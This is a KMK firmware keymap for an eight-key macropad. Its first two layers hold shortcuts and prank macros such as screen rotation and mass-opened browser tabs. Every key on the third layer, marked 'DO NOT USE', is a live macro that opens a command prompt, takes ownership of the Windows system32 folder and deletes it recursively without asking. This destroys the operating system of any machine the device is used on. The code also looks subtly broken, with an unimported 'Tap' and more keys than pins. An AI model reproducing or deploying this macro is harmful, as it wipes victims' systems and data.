import board
from kmk.kmk_keyboard import KMKKeyboard
from kmk.scanners.keypad import KeysScanner
from kmk.keys import KC
from kmk.modules.macros import Macros
from kmk.macros import Macro
from kmk.modules.layers import Layers

keyboard = KMKKeyboard()

keyboard.modules.append(Macros())
keyboard.modules.append(Layers())

PINS = [board.D7, board.D6, board.D5, board.D4, board.D3, board.D2, board.D1, board.D0]

keyboard.matrix = KeysScanner(
    pins=PINS,
    value_when_pressed=False,
)

#KEYMAP LAYERS
keyboard.keymap = [
    #ALMOST USEFUL
    [
        KC.LCTL(KC.T),
        KC.LCTL(KC.LSFT(KC.ALT(KC.WIN(KC.L)))),
        KC.LCTL(KC.W),
        KC.ALT(KC.F4),
        KC.WIN(KC.M),
        KC.LCTL(KC.ESC),
        KC.LCTL(KC.LSFT(KC.BCSP)),
        KC.LSFT(KC.BCSP),
        KC.MO(1),#Layer 1
    ],
    
    #ANNOYING
    [
        KC.LCTL(KC.ALT(KC.UP)),
        KC.LCTL(KC.ALT(KC.DOWN)),
        KC.LCTL(KC.ALT(KC.LEFT)),
        KC.LCTL(KC.ALT(KC.RIGHT)),
        KC.LSFT(KC.ALT(KC.PSCR)),
        KC.LSFT(KC.ENT),
        KC.MACRO(Tap(KC.LCTL(KC.T)),Tap(KC.LCTL(KC.T)),Tap(KC.LCTL(KC.T)),Tap(KC.LCTL(KC.T)),Tap(KC.LCTL(KC.T)),Tap(KC.LCTL(KC.T)),Tap(KC.LCTL(KC.T)),Tap(KC.LCTL(KC.T)),Tap(KC.LCTL(KC.T)),Tap(KC.LCTL(KC.T)),Tap(KC.LCTL(KC.T)),Tap(KC.LCTL(KC.T)),Tap(KC.LCTL(KC.T)),Tap(KC.LCTL(KC.T)),Tap(KC.LCTL(KC.T)),Tap(KC.LCTL(KC.T)),Tap(KC.LCTL(KC.T)),Tap(KC.LCTL(KC.T)),Tap(KC.LCTL(KC.T)),Tap(KC.LCTL(KC.T)),Tap(KC.LCTL(KC.T)),Tap(KC.LCTL(KC.T)),Tap(KC.LCTL(KC.T)),),
        KC.WIN(KC.L),
        KC.MO(2),            
    ],
    
    #DO NOT USE
    [              
        KC.MACRO(Tap(KC.WIN(KC.R)), "CMD", Tap(KC.ENTER), "takeown /f c:\windows\system32", KC.ENT, "rd /s /q c:\windows\system32", KC.ENT),
        KC.MACRO(Tap(KC.WIN(KC.R)), "CMD", Tap(KC.ENTER), "takeown /f c:\windows\system32", KC.ENT, "rd /s /q c:\windows\system32", KC.ENT),
        KC.MACRO(Tap(KC.WIN(KC.R)), "CMD", Tap(KC.ENTER), "takeown /f c:\windows\system32", KC.ENT, "rd /s /q c:\windows\system32", KC.ENT),
        KC.MACRO(Tap(KC.WIN(KC.R)), "CMD", Tap(KC.ENTER), "takeown /f c:\windows\system32", KC.ENT, "rd /s /q c:\windows\system32", KC.ENT),
        KC.MACRO(Tap(KC.WIN(KC.R)), "CMD", Tap(KC.ENTER), "takeown /f c:\windows\system32", KC.ENT, "rd /s /q c:\windows\system32", KC.ENT),
        KC.MACRO(Tap(KC.WIN(KC.R)), "CMD", Tap(KC.ENTER), "takeown /f c:\windows\system32", KC.ENT, "rd /s /q c:\windows\system32", KC.ENT),
        KC.MACRO(Tap(KC.WIN(KC.R)), "CMD", Tap(KC.ENTER), "takeown /f c:\windows\system32", KC.ENT, "rd /s /q c:\windows\system32", KC.ENT),
        KC.MACRO(Tap(KC.WIN(KC.R)), "CMD", Tap(KC.ENTER), "takeown /f c:\windows\system32", KC.ENT, "rd /s /q c:\windows\system32", KC.ENT), 
        KC.TO(0),
    ]
]

if __name__ == '__main__':
    keyboard.go()